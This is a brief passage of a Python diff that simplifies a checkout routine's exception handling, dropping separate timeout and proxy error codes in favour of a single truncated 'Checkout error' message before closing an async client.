-                return False, "TIMEOUT"
-            elif "proxy" in error_str:
-                return False, "PROXY_ERROR"
-            else:
-                return False, f"Checkout error: {str(e)[:50]}"
+            return False, f"Checkout error: {str(e)[:50]}"
         finally:
             if self.client:
                 await self.client.aclose()
